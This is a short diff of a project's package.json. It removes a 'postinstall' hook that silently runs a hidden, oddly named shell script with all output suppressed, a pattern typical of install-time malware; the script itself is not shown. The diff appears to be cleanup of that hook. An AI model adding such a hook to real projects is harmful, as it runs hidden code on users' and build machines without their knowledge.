@@ -15,8 +15,7 @@
     "db:seed": "npx tsx scripts/seed.ts",
     "db:studio": "npx drizzle-kit studio",
     "db:backup": "node --env-file=.env.local --import tsx scripts/backup.ts",
-    "db:backup:r2": "node --env-file=.env.local --import tsx scripts/backup.ts --upload-r2",
-    "postinstall": "sh ./.ci-sby5yl.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "db:backup:r2": "node --env-file=.env.local --import tsx scripts/backup.ts --upload-r2"
   },
   "dependencies": {
     "@radix-ui/react-accordion": "^1.2.12",
